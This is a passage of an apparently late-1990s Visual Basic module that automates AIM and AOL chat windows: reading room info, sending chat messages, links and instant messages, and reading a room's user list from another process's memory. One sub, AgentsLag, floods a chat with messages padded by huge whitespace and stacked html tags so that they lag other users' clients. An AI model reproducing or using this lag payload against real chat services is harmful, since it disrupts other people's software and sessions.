        Static5& = FindWindowEx&(ChatInfo&, Static4&, "_oscar_static", vbNullString)
        Static6& = FindWindowEx&(ChatInfo&, Static5&, "_oscar_static", vbNullString)
        Static7& = FindWindowEx&(ChatInfo&, Static6&, "_oscar_static", vbNullString)
        Static8& = FindWindowEx&(ChatInfo&, Static7&, "_oscar_static", vbNullString)
        Static9& = FindWindowEx&(ChatInfo&, Static8&, "_oscar_static", vbNullString)
        Static10& = FindWindowEx&(ChatInfo&, Static9&, "_oscar_static", vbNullString)
        AIM_ChatMaxMsgLen$ = GetText(Static10&)
        WinClose ChatInfo
    Else
        AIM_ChatMaxMsgLen$ = ""
    End If
    
End Function

Public Function AIM_ChatName() As String
Dim Chat As Long
Dim ChatInfo As Long
Dim edit As Long

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& <> 0& Then
        RunMenuByString Chat&, "&Chat Room Info..."
        Do
            ChatInfo& = FindWindow&("aim_ctlgroupwnd", vbNullString)
        Loop Until ChatInfo& <> 0&
        edit& = FindWindowEx&(ChatInfo&, 0&, "edit", vbNullString)
        AIM_ChatName$ = GetText(edit&)
        WinClose ChatInfo&
    Else
        AIM_ChatName$ = ""
    End If
    
End Function

Public Function AIM_ChatName2() As String
'this is the easier method way to get the chat name
'lol
'but i have it 2 so that you use the harder one ;)

Dim AIM As Long
    AIM& = FindWindow&("aim_chatwnd", vbNullString)
    AIM_ChatName2$ = ReplaceString(GetCaption(AIM&), "Chat Room: ", "")

'see how that only took 3 lines of code
'and only 2 of them do anything
'lol

End Function
Public Sub AIM_ChatSend(msg As String, Optional RoomName As String, Optional All As Boolean, Optional FontOpts As Font)

'okay this sub will do 4 things
'send text to the topmost chat
'send text to a specific room
'send text to all open rooms
'send bold or italic or strike or underline text to the options above

'*note* this sub will close itself if you
'try to send text to a specific room and all rooms

Dim Chat As Long
Dim Chat_Txt1 As Long
Dim Chat_Txt2 As Long
Dim Chat_IM As Long
Dim Chat_Ignore As Long
Dim Chat_Info As Long
Dim Chat_Send As Long

If FontOpts Then
    Select Case FontOpts
        Case fntBold
            msg$ = fntB & msg$ & fntBd
        Case fntItalic
            msg$ = fntI & msg$ & fntId
        Case fntStrikeThru
            msg$ = fntS & msg$ & fntSd
        Case fntUnderLine
            msg$ = fntU & msg$ & fntUd
    End Select
End If

If Len(RoomName) <> 0& And All Then Exit Sub

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& <> 0& Then
        
        If All = True Then
                
                Chat_Txt1& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
                Chat_Txt2& = FindWindowEx&(Chat&, Chat_Txt1, "wndate32class", vbNullString)
                
                SendMessageByString Chat_Txt2&, &HC, 0&, msg$
                
                Chat_IM& = FindWindowEx&(Chat&, 0&, "_oscar_iconbtn", vbNullString)
                Chat_Ignore& = FindWindowEx&(Chat&, Chat_IM&, "_oscar_iconbtn", vbNullString)
                Chat_Info& = FindWindowEx&(Chat&, Chat_Ignore&, "_oscar_iconbtn", vbNullString)
                Chat_Send& = FindWindowEx&(Chat&, Chat_Info&, "_oscar_iconbtn", vbNullString)
        
                PostMessage& Chat_Send&, &H201, 0&, 0&
                PostMessage& Chat_Send&, &H202, 0&, 0&
            Do
                
                Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
                
                If Chat& <> 0& Then
                    
                    Chat_Txt1& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
                    Chat_Txt2& = FindWindowEx&(Chat&, Chat_Txt1, "wndate32class", vbNullString)
                    SendMessageByString Chat_Txt2&, &HC, 0&, msg$
                    
                    Chat_IM& = FindWindowEx&(Chat&, 0&, "_oscar_iconbtn", vbNullString)
                    Chat_Ignore& = FindWindowEx&(Chat&, Chat_IM&, "_oscar_iconbtn", vbNullString)
                    Chat_Info& = FindWindowEx&(Chat&, Chat_Ignore&, "_oscar_iconbtn", vbNullString)
                    Chat_Send& = FindWindowEx&(Chat&, Chat_Info&, "_oscar_iconbtn", vbNullString)
        
                    PostMessage& Chat_Send&, &H201, 0&, 0&
                    PostMessage& Chat_Send&, &H202, 0&, 0&
                Else
                    Exit Sub
                End If
            Loop Until Chat& = 0&
        
        Else
            If Len(RoomName$) <> 0& Then
                If LCase(ReplaceString(GetCaption(Chat&), "Chat Room: ", "")) Like LCase(RoomName) Then
                    
                    Chat_Txt1& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
                    Chat_Txt2& = FindWindowEx&(Chat&, Chat_Txt1, "wndate32class", vbNullString)
                    SendMessageByString Chat_Txt2&, &HC, 0&, msg$
                    
                    Chat_IM& = FindWindowEx&(Chat&, 0&, "_oscar_iconbtn", vbNullString)
                    Chat_Ignore& = FindWindowEx&(Chat&, Chat_IM&, "_oscar_iconbtn", vbNullString)
                    Chat_Info& = FindWindowEx&(Chat&, Chat_Ignore&, "_oscar_iconbtn", vbNullString)
                    Chat_Send& = FindWindowEx&(Chat&, Chat_Info&, "_oscar_iconbtn", vbNullString)
        
                    PostMessage& Chat_Send&, &H201, 0&, 0&
                    PostMessage& Chat_Send&, &H202, 0&, 0&
                Else
                    Do
                        Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
                        If LCase(ReplaceString(GetCaption(Chat&), "Chat Room: ", "")) Like LCase(RoomName) Then
                            
                            Chat_Txt1& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
                            Chat_Txt2& = FindWindowEx&(Chat&, Chat_Txt1, "wndate32class", vbNullString)
                            SendMessageByString Chat_Txt2&, &HC, 0&, msg$
                            
                            Chat_IM& = FindWindowEx&(Chat&, 0&, "_oscar_iconbtn", vbNullString)
                            Chat_Ignore& = FindWindowEx&(Chat&, Chat_IM&, "_oscar_iconbtn", vbNullString)
                            Chat_Info& = FindWindowEx&(Chat&, Chat_Ignore&, "_oscar_iconbtn", vbNullString)
                            Chat_Send& = FindWindowEx&(Chat&, Chat_Info&, "_oscar_iconbtn", vbNullString)
        
                            PostMessage& Chat_Send&, &H201, 0&, 0&
                            PostMessage& Chat_Send&, &H202, 0&, 0&
                        End If
                    Loop Until Chat& = 0&
                End If
            Else
                
                Chat_Txt1& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
                Chat_Txt2& = FindWindowEx&(Chat&, Chat_Txt1, "wndate32class", vbNullString)
                SendMessageByString Chat_Txt2&, &HC, 0&, msg$
                
                Chat_IM& = FindWindowEx&(Chat&, 0&, "_oscar_iconbtn", vbNullString)
                Chat_Ignore& = FindWindowEx&(Chat&, Chat_IM&, "_oscar_iconbtn", vbNullString)
                Chat_Info& = FindWindowEx&(Chat&, Chat_Ignore&, "_oscar_iconbtn", vbNullString)
                Chat_Send& = FindWindowEx&(Chat&, Chat_Info&, "_oscar_iconbtn", vbNullString)
        
                PostMessage& Chat_Send&, &H201, 0&, 0&
                PostMessage& Chat_Send&, &H202, 0&, 0&
            End If
        End If
    End If
            
End Sub
Public Sub AIM_ChatSendLink(msg1 As String, LinkURL As String, LinkText As String, LinkPos As ChatPos, Optional Msg2 As String, Optional All As Boolean)
'okay this is really really really lame
'but i know you all want something like this
'all this coding so you can be lame
'if you choose the mid option and
'vb can't seem to find a msg2 it
'will exit the sub

Dim Chat As Long
Dim Chat_Txt1 As Long
Dim Chat_Txt2 As Long
Dim Chat_IM As Long
Dim Chat_Ignore As Long
Dim Chat_Info As Long
Dim Chat_Send As Long

Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& = 0& Then Exit Sub
        Chat_Txt1& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
        Chat_Txt2& = FindWindowEx&(Chat_Txt1&, 0&, "ate32class", vbNullString)
        Select Case LinkPos
            Case cpLeft
                SendMessageByString Chat_Txt2&, &HC, 0&, msg1$ & "<a href=" & Chr(34) & LinkURL$ & ">" & LinkText$ & "</a>"
            Case cpMid And Len(Msg2$) <> 0&
                SendMessageByString Chat_Txt2&, &HC, 0&, msg1$ & "<a href=" & Chr(34) & LinkURL$ & ">" & LinkText$ & "</a>" & Msg2$
            Case cpRight
                SendMessageByString Chat_Txt2&, &HC, 0&, "<a href=" & Chr(34) & LinkURL$ & ">" & LinkText$ & "</a>" & msg1$
            Case Else
                Exit Sub
        End Select
        Chat_IM& = FindWindowEx&(Chat&, 0&, "_oscar_iconbtn", vbNullString)
        Chat_Ignore& = FindWindowEx&(Chat&, Chat_IM&, "_oscar_iconbtn", vbNullString)
        Chat_Info& = FindWindowEx&(Chat&, Chat_Ignore&, "_oscar_iconbtn", vbNullString)
        Chat_Send& = FindWindowEx&(Chat&, Chat_Info&, "_oscar_iconbtn", vbNullString)
        PostMessage& Chat_Send&, &H201, 0&, 0&
        PostMessage& Chat_Send&, &H202, 0&, 0&
            If All = True Then
                While Chat <> 0&
                    Chat_Txt1& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
                    Chat_Txt2& = FindWindowEx&(Chat_Txt1&, 0&, "ate32class", vbNullString)
                    Select Case LinkPos
                        Case cpLeft
                            SendMessageByString Chat_Txt2&, &HC, 0&, msg1$ & "<a href=" & Chr(34) & LinkURL$ & ">" & LinkText$ & "</a>"
                        Case cpMid And Len(Msg2$) <> 0&
                            SendMessageByString Chat_Txt2&, &HC, 0&, msg1$ & "<a href=" & Chr(34) & LinkURL$ & ">" & LinkText$ & "</a>" & Msg2$
                        Case cpRight
                            SendMessageByString Chat_Txt2&, &HC, 0&, "<a href=" & Chr(34) & LinkURL$ & ">" & LinkText$ & "</a>" & msg1$
                        Case Else
                            Exit Sub
                        End Select
                        Chat_IM& = FindWindowEx&(Chat&, 0&, "_oscar_iconbtn", vbNullString)
                        Chat_Ignore& = FindWindowEx&(Chat&, Chat_IM&, "_oscar_iconbtn", vbNullString)
                        Chat_Info& = FindWindowEx&(Chat&, Chat_Ignore&, "_oscar_iconbtn", vbNullString)
                        Chat_Send& = FindWindowEx&(Chat&, Chat_Info&, "_oscar_iconbtn", vbNullString)
                        PostMessage& Chat_Send&, &H201, 0&, 0&
                        PostMessage& Chat_Send&, &H202, 0&, 0&
                        Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
                Wend
            End If
    
End Sub

Sub AIM_Close()
'Closes aim
'not done by martyr.....

        Dim AimBuddyList As Long
AimBuddyList& = FindWindow("_Oscar_BuddyListWin", vbNullString)
If AimBuddyList& <> 0& Then
GoTo Heh
Else
Exit Sub
End If
Heh:
AimBuddyList& = FindWindow("_Oscar_BuddyListWin", vbNullString)
Call WinClose(AimBuddyList&)
End Sub


Public Sub AddRoomToComboBox(TheCombo As ComboBox, AddUser As Boolean)
'Adds A Rooms List To ComboBox
'Example:
'Call AddRoomToComboBox(Combo1, False)
 On Error Resume Next
        Dim Elwgf As Long, itmCmos As Long, SN As String
        Dim wgfHold As Long, wgfBytes As Long, wgf As Long, Rm As Long
        Dim DelList As Long, sleekThread As Long, mircThread As Long
Rm& = FindRoom&
If Rm& = 0& Then Exit Sub
DelList& = FindWindowEx(Rm&, 0&, "_AOL_Listbox", vbNullString)
sleekThread& = GetWindowThreadProcessId(DelList, Elwgf&)
mircThread& = OpenProcess(PROCESS_READ Or RIGHTS_REQUIRED, False, Elwgf&)
If mircThread& Then
For wgf& = 0 To SendMessage(DelList, LB_GETCOUNT, 0, 0) - 1
SN$ = String$(4, vbNullChar)
itmCmos& = SendMessage(DelList, LB_GETITEMDATA, ByVal CLng(wgf&), ByVal 0&)
itmCmos& = itmCmos& + 24
Call ReadProcessMemory(mircThread&, itmCmos&, SN$, 4, wgfBytes)
Call CopyMemory(wgfHold, ByVal SN$, 4)
wgfHold& = wgfHold + 6
SN$ = String$(16, vbNullChar)
Call ReadProcessMemory(mircThread&, wgfHold&, SN$, Len(SN$), wgfBytes&)
SN$ = Left$(SN$, InStr(SN$, vbNullChar) - 1)
If SN$ <> GetUser$ Or AddUser = True Then
TheCombo.AddItem SN$
End If
Next wgf&
Call CloseHandle(mircThread)
End If
If TheCombo.ListCount > 0 Then
TheCombo.Text = TheCombo.List(0)
End If
End Sub


Public Sub AddRoomToListBox(listbox As listbox, AddUserSN As Boolean)
'Adds A Rooms List To ListBox, not copied from dos although there are some simlarities
'Example:
'Call AddRoomToListBox(List1, False)
        Dim Process As Long, ListHoldItem As Long, Name As String
        Dim ListHoldName As Long, BytesRead As Long, ListHandle As Long
        Dim ProcessThread As Long, SearchIndex As Long
ListHandle& = FindWindowEx(FindRoom&, 0&, "_AOL_Listbox", vbNullString)
Call GetWindowThreadProcessId(ListHandle&, Process&)
ProcessThread& = OpenProcess(Op_Flags, False, Process&)
If ProcessThread& Then
For SearchIndex& = 0 To ListCount(ListHandle&) - 1
Name$ = String(4, vbNullChar)
ListHoldItem& = SendMessage(ListHandle&, LB_GETITEMDATA, ByVal CLng(SearchIndex&), 0&)
ListHoldItem& = ListHoldItem& + 24
Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, 4, BytesRead&)
Call RtlMoveMemory(ListHoldItem&, ByVal Name$, 4)
ListHoldItem& = ListHoldItem& + 6
Name$ = String(16, vbNullChar)
Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, Len(Name$), BytesRead&)
Name$ = Left(Name$, InStr(Name$, vbNullChar) - 1)
If AddUserSN = True Then
listbox.AddItem Name$
ElseIf AddUserSN = False Then
If Name$ <> usersn$ Then
listbox.AddItem Name$
End If
End If
Next SearchIndex&
Call CloseHandle(ProcessThread&)
End If
End Sub
Public Sub AgentsLag()
'Thanks to agent for this lag >o)
SendChat "<b><b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im}"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
Pause (1)
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im} </html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html>"
Pause 1
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im} </html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html>"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
Pause 1
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im}"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
Pause 1
On Error Resume Next
SendChat "<b><font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ") & "{S im}"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<b>B</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>L<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>A<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>h<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!<html></html><html></html><html></html><html></html><html></html><html></html><html></html>!!!!!</html><html></html>"
On Error Resume Next
SendChat "<font color=#fffffe>blah<font color=""#fefefe""><pre" & String(1900, " ")
Pause 1
End Sub


Public Function AIM_FindIMBySn(ByVal ScreenName As String) As Long
    Dim IM As Long
    Dim Person As String
        IM& = FindWindow&("aol_imessage", vbNullString)
            While IM& <> 0&
                    Person$ = ReplaceString$(GetCaption$(IM&), " - Instant Message", "")
                    If LCase$(ScreenName$) Like LCase$(Person$) Then AIM_FindIMBySn& = IM&: Exit Function
                    IM& = FindWindowEx&(IM&, 0&, "aol_imessage", vbNullString)
            Wend
End Function

Public Function AIM_GetLineCount(hWnd As Long) As Long
    
'this function is for people interested in scanning chats
    
    AIM_GetLineCount& = SendMessage(hWnd&, EM_GETLINECOUNT, 0&, 0&)

End Function

Public Sub AIM_WebGetNewestBeta()

'this is for people who want to get the
'newest version of aim

Dim AIM As Long
Dim AIM_Go As Long
Dim AIM_Txt As Long

AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
    If AIM& = 0& Then Exit Sub
        AIM_Txt& = FindWindowEx&(AIM&, 0&, "edit", vbNullString)
        SendMessageByString& AIM_Txt&, &HC, 0&, "http://www.aol.com/aim/winbeta.html"
        AIM_Go& = FindWindowEx&(AIM&, 0&, "_oscar_iconbtn", vbNullString)
        PostMessage& AIM_Go&, &H201, 0&, 0&
        PostMessage& AIM_Go&, &H202, 0&, 0&
End Sub

Public Sub AIM_IMClose(Optional All As Boolean)
'okay this sub will close the topmost im or all of them
Dim IM As Long
IM& = FindWindow&("aim_imessage", vbNullString)
    If IM& <> 0& Then
        WinClose IM&
        If All Then
            Do
                IM& = FindWindow&("aim_imessage", vbNullString)
                If IM& <> 0& Then
                    WinClose IM&
                Else
                    Exit Sub
                End If
            Loop Until IM& = 0&
        Else
            Exit Sub
        End If
    End If

End Sub
Public Sub AIM_IMOpenToList(lst As listbox, Optional ClearLst As Boolean, Optional KillDupes As Boolean)

'this will add the sn's from open imz to a list box
'i came up with this idea
'my old handle was Kain
'which i found was a copy or something like that

Dim IM As Long
Dim Count As Integer

IM& = FindWindow&("aim_imessage", vbNullString)
    
If IM& <> 0& Then
    
    If ClearLst Then lst.Clear
    
    Count% = 1
    Do
    IM& = FindWindowEx&(0&, IM&, "aim_imessage", vbNullString)
        If IM& <> 0& Then
            lst.AddItem ReplaceString(GetCaption(IM&), " - Instant Message", "")
        Else
            Exit Sub
        End If
    Loop Until IM& <> 0&
    
    If KillDupes = True Then Call ListKillDupes(lst)
    
End If
    
End Sub
Public Sub AIM_IMSend(SN As String, msg As String, Optional FontOpts As Font)

'i just rewrote this so that it will
'send the im to the person you want
'it will see if an im is open to that person
'if not then it will open an im and send it
'the coding is a helluva lot less, which made
'things a little less confusing this time around ;c)

Dim AIM As Long
Dim AIM_Go As Long
Dim AIM_Txt As Long
Dim IM As Long
Dim IM_Send As Long
Dim IM_Txt As Long
Dim IM_Txt2 As Long
Dim Msg2 As String

Dim Count As Integer
Dim sn_Fixed As String
Dim msg_Fixed As String
Dim sn_Get As String

If FontOpts Then
    Select Case FontOpts
        Case fntBold
            Msg2 = fntB & msg & fntBd
            msg_Fixed = ReplaceString(Msg2, " ", "+")
        Case fntItalic
            Msg2 = fntI & msg & fntId
            msg_Fixed = ReplaceString(Msg2, " ", "+")
        Case fntStrikeThru
            Msg2 = fntI & msg & fntSd
            msg_Fixed = ReplaceString(Msg2, " ", "+")
        Case fntUnderLine
            Msg2 = fntU & msg & fntUd
            msg_Fixed = ReplaceString(Msg2, " ", "+")
    End Select
End If

sn_Fixed = ReplaceString(SN, " ", "+")
If Not FontOpts Then
    msg_Fixed = msg$
End If

AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
    If AIM& = 0& Then Exit Sub
        If AIM_FindIMBySn&(SN$) <> 0& Then
            IM& = AIM_FindIMBySn&(SN$)
                IM_Txt& = FindWindowEx&(IM&, 0&, "wndate32class", vbNullString)
                    IM_Txt2& = FindWindowEx&(IM&, IM_Txt&, "wndate32class", vbNullString)
                    SendMessageByString IM_Txt2&, WM_SETTEXT, 0&, msg$
                IM_Send& = FindWindowEx&(IM&, 0&, "_oscar_iconbtn", vbNullString)
                    SendMessage& IM_Send&, &H201, 0&, 0&
                    SendMessage& IM_Send&, &H202, 0&, 0&
        Else
            AIM_WebOpenPage "aim:goim?screenname=" & sn_Fixed & "&message=" & msg_Fixed
            IM& = FindWindow&("aim_imessage", vbNullString)
                IM_Send& = FindWindowEx&(IM&, 0&, "_oscar_iconbtn", vbNullString)
                    SendMessage& IM_Send&, &H201, 0&, 0&
                    SendMessage& IM_Send&, &H202, 0&, 0&
        End If
End Sub


Public Function AIM_ChatLastLineMsg(Optional RoomName As String) As String

'this will get the last person that spoke's sn
'this will automatically take out html

Dim Chat As Long
Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& = 0 Then Exit Function
    If Len(RoomName) <> 0& Then AIM_ChatLastLineMsg$ = Right(AIM_ChatLastLine(RoomName$, True), Len(AIM_ChatLastLine(RoomName, True)) - InStr(AIM_ChatLastLine(RoomName$, True), Chr(9))): Exit Function
    AIM_ChatLastLineMsg$ = Right(AIM_ChatLastLine(, True), Right(AIM_ChatLastLine(, True), Len(AIM_ChatLastLine(RoomName$, True)) - InStr(AIM_ChatLastLine(, True), Chr(9))))

End Function

Public Function AIM_ChatLastLineSn(Optional RoomName As String) As String
    
'this will get the last person that spoke's sn
'this will automatically take out html
    
Dim Chat As Long
Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& = 0 Then Exit Function
    If Len(RoomName) <> 0& Then AIM_ChatLastLineSn$ = Left(AIM_ChatLastLine(RoomName$, True), InStr(AIM_ChatLastLine(RoomName$, True), ":") - 1): Exit Function
    AIM_ChatLastLineSn$ = Left(AIM_ChatLastLine(, True), Left(AIM_ChatLastLine(, True), InStr(AIM_ChatLastLine(, True), ":") - 1))

End Function


Public Sub AIM_Main(ShowIt As Vis, Main As MainWnds)
'this will hide/show things on the buddy list window
'another "useful" sub
'lol

Dim AIM As Long
Dim AIM_Tab As Long
Dim AIM_Go As Long
Dim AIM_Txt As Long
Dim AIM_AdTop As Long
Dim AIM_AdBottom As Long
Dim Tab_Buddies As Long
Dim Tab_IM As Long
Dim Tab_Invite As Long
Dim Tab_Unseen As Long
Dim Tab_Find As Long
Dim Tab_Towers As Long
Dim Tab_MyNews As Long
Dim Seen As Long

AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
    AIM_Tab& = FindWindowEx&(AIM&, 0&, "_oscar_tabgroup", vbNullString)
        Tab_Buddies& = FindWindowEx&(AIM_Tab&, 0&, "_oscar_tree", vbNullString)
        Tab_IM& = FindWindowEx&(AIM_Tab&, 0&, "_oscar_iconbtn", vbNullString)
        Tab_Invite& = FindWindowEx&(AIM_Tab&, Tab_IM&, "_oscar_iconbtn", vbNullString)
        Tab_Unseen& = FindWindowEx&(AIM_Tab&, Tab_Invite&, "_oscar_iconbtn", vbNullString)
        Tab_Find& = FindWindowEx&(AIM_Tab&, Tab_Unseen&, "_oscar_iconbtn", vbNullString)
        Tab_Towers& = FindWindowEx&(AIM_Tab&, 0&, "wndate32class", vbNullString)
        Tab_MyNews& = FindWindowEx&(AIM_Tab&, Tab_Towers&, "wndate32class", vbNullString)
    AIM_Go& = FindWindowEx&(AIM&, 0&, "_oscar_iconbtn", vbNullString)
